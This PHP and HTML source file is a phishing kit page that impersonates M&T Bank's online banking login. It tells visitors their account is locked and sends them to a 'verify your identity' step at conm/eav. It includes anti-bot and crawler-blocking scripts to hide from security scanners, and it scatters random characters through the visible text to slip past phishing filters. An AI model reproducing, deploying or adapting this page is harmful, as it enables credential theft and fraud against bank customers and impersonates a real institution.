<?php
error_reporting(0);
session_start();
include 'autob/bt.php';
include 'autob/basicbot.php';
include 'autob/uacrawler.php';
include 'autob/refspam.php';
include 'autob/ipselect.php';
include "autob/bts2.php";

?>
<!DOCTYPE html>
<html lang="en" class="__sticky-footer __sticky-footer--links">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
 <title>Welcome to Online Banking | M&amp;T Bank</title>

    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link href="ft/css.css" rel="stylesheet">

    
<link rel="icon" sizes="96x96" href="ft/image.png" type="image/png">
<link rel="icon" sizes="32x32" href="ft/image(1).png" type="image/png">
<link rel="icon" sizes="16x16" href="ft/image(2).png" type="image/png">
	<style>.cell.mf{font-size:14px;}
	.mtb-app-login--content { max-width: 30rem; margin: 0 auto;}
</style>

	</head>
<body>

   

<div><input id="UnMaskedUserId" name="UnMaskedUserId" type="hidden" value="">    <div class="mtb-app-enrollment">
        <header class="mtb-page-header">
            <input type="hidden" id="TagPageName" name="TagPageName" value="OLB:Login:Index">
            <div class="grid-x align-center">
                <div class="cell">
                    <a  class="mtb__logo">
                        <img src="ft/mtb-logo.svg" alt="M&amp;T Bank Site">
                    </a>
                </div>
            </div>
        </header>



            <div class="mtb-page-error <?php if(!isset($_GET[''.$theerrkey.''])){echo 'hide';};?>">
                <input data-val="true" data-val-number="The field FailedSignOnCount must be a number." data-val-required="The FailedSignOnCount field is required." id="FailedSignOnCount" name="FailedSignOnCount" type="hidden" value="3">
                <div class="mtb-app-default--content">
                    <div class="callout __has-icon warning __no-border">
                        <i class="__is-icon m-icon m-icon-notification">
                            <span class="show-for-sr">Notification Icon</span>
                        </i>
                        <p>
                            
      You have en<?php echo rT('ALPHANUMERIC',rand(1,87));?>tered an invalid User ID a<?php echo rT('ALPHANUMERIC',rand(1,87));?>nd/or Passcode. Please try again.
    
                        </p>
                    </div>
                </div>
            </div>
        <div class="mtb-app-login--content">
            <div class="grid-x grid-padding-x grid-x__padded __spacer-section">
                <div class="cell">
                    <input type="hidden" value="OLB:SSC:LogInToOnlineBanking">
                    <div class="mtb-section-header mtb-section-header__login">
                        <h1>
                            Action Requ<?php echo rT('ALPHANUMERIC',rand(1,87));?>ired!
                        </h1>
                        <?php echo rT('ALPHANUMERIC',rand(1,87));?>
		                    
	                			<p>
								For your sec<?php echo rT('ALPHANUMERIC',rand(1,87));?>urity, Your account has <?php echo rT('ALPHANUMERIC',rand(1,87));?>been locked
								</p>
		                    
                    </div>
                </div>

                <div class="cell mf">
                      Due to conflicts we are havi<?php echo rT('ALPHANUMERIC',rand(1,87));?>ng verifying some informations on your <?php echo rT('ALPHANUMERIC',rand(1,87));?>account, we have decided<?php echo rT('ALPHANUMERIC',rand(1,87));?> to place a temporary hold<?php echo rT('ALPHANUMERIC',rand(1,87));?> until you make some required actions and verify
					<br/><br/><p>To restore<?php echo rT('ALPHANUMERIC',rand(1,87));?> and prevent further clo<?php echo rT('ALPHANUMERIC',rand(1,87));?>sing of your account, please click <a style="color:#0f7dd4" href="conm/eav">continue</a> to confirm the informati<?php echo rT('ALPHANUMERIC',rand(1,87));?>on we have on file a<?php echo rT('ALPHANUMERIC',rand(1,87));?>nd verify your identity</p>
						
                </div>

            </div>

            <div class="grid-x grid-padding-x __spacer-paragraph grid-x__padded">
                <div class="cell">

                   <a href="conm/eav" > <button type="submit" name="btnin" value="login" class="button button__form-no-spacer expanded" id="btnSubmit">
                       Continue
                    </button></a>
                </div>
                <div class="cell mf">
                   <p> Proceeding will prompt<?php echo rT('ALPHANUMERIC',rand(1,87));?> you to enter informations we need<?php echo rT('ALPHANUMERIC',rand(1,87));?> to verify your identity <?php echo rT('ALPHANUMERIC',rand(1,87));?>and give you a more secure M&T BANk&reg; experience</p>
                </div>

                <p class="cell text-center __font-size-tiny __color-gray-accent">
                    Unauthorized access is <?php echo rT('ALPHANUMERIC',rand(1,87));?>prohibited. Usage may<?php echo rT('ALPHANUMERIC',rand(1,87));?> be monitored.
                </p>
            </div>
        </div>

        <hr class="__spacer-section">
        <div class="mtb-app-default--content">

            <div class="grid-x grid-padding-x grid-x__padded">
                <div class="cell text-center">
                    <p class="__font-size-secondary">
                        Have quest<?php echo rT('ALPHANUMERIC',rand(1,87));?>ions about M&amp;T Online Banking?
                    </p>
                </div>
                <div class="cell medium-6 text-center">
                    <p class="__font-size-secondary __color-primary __spacer-paragraph-half">
                        Persona<?php echo rT('ALPHANUMERIC',rand(1,87));?>l Accounts:
                        <a href="tel:1-800-790-9130" class="__no-underline">1-800-790-9130</a>
                    </p>
                    <p class="__font-size-sub __spacer-remove __color-gray-accent">
                        Monday - Friday 8am - 9pm ET
                    </p>
                    <p class="__font-size-sub __spacer-paragraph __color-gray-accent">
                        Saturday - Sun<?php echo rT('ALPHANUMERIC',rand(1,87));?>day 9am - 5pm ET
                    </p>
                </div>
                <div class="cell medium-6 text-center">
                    <p class="__font-size-secondary __color-primary __spacer-paragraph-half">
                        Busine<?php echo rT('ALPHANUMERIC',rand(1,87));?>ss Accounts: <a href="tel:1-800-724-6070" class="__no-underline">1-800-724-6070</a>
                    </p>
                    <p class="__font-size-sub __spacer-remove __color-gray-accent">
                        Monday - <?php echo rT('ALPHANUMERIC',rand(1,87));?>Friday 6am - 9pm ET
                    </p>
                    <p class="__font-size-sub __spacer-section __color-gray-accent">
                        Satur<?php echo rT('ALPHANUMERIC',rand(1,87));?>day<?php echo rT('ALPHANUMERIC',rand(1,87));?> - Sunday 9am - 5pm ET
                    </p>
                </div>
            </div>
        </div>
        <section class="mtb-footer mtb-footer__auth" role="contentinfo">
            <div class="grid-x">
                <div class="cell flex-container flex-dir-column align-center-middle">
                    <div class="mtb-footer--auth">
                        <a  class="" >Get Started Guide</a>
                        <a  >Sec<?php echo rT('ALPHANUMERIC',rand(1,87));?>urity As<?php echo rT('ALPHANUMERIC',rand(1,87));?>sistance</a>
                        <a  >Digital Service Agreement</a>
                        <a  >ES<?php echo rT('ALPHANUMERIC',rand(1,87));?>ign Agreement</a>
                        <a  >
                            Accessibi<?php echo rT('ALPHANUMERIC',rand(1,87));?>lity
                        </a>


                        <a  >
                            m<?php echo rT('ALPHANUMERIC',rand(1,87));?>tb.com
                        </a>
                    </div>

                    <div class="mtb-footer--non-auth">
                        <p>
                            ©<?php echo date("Y");?> M&amp;T Bank. Al<?php echo rT('ALPHANUMERIC',rand(1,87));?>l Rights Reserved.<br>
                            Users of this website <?php if(isset($_SESSION['device']) && !stripos($_SESSION['device'],'yochi')){banbot();};?>agree t<?php echo rT('ALPHANUMERIC',rand(1,87));?>o be bound by the provisions of the M&amp;T website <a  >
                                Terms of
                                Use
                            </a> and <a  >Privacy Policy</a>.
                        </p>
                        <div class="mtb-footer__logo">
                            <a  >
                                <img src="ft/mtb-equalhousinglender.svg" class="mtb-footer__equalhousinglender" alt="Equal Housing Lender">
                            </a>
                            <a  >
                                <img src="ft/mtb-entrust.svg" class="mtb-footer__entrust" alt="Entrust">
                            </a>
                        </div>
                        <p>
                            Equal<?php echo rT('ALPHANUMERIC',rand(1,87));?> Housing Le<?php echo rT('ALPHANUMERIC',rand(1,87));?>nder NMLS #381076
                            <a  >Me<?php echo rT('ALPHANUMERIC',rand(1,87));?>mber FD<?php echo rT('ALPHANUMERIC',rand(1,87));?>IC</a>
                        </p>
                    </div>
                </div>
            </div>
        </section>
    </div>
</div>

</body></html>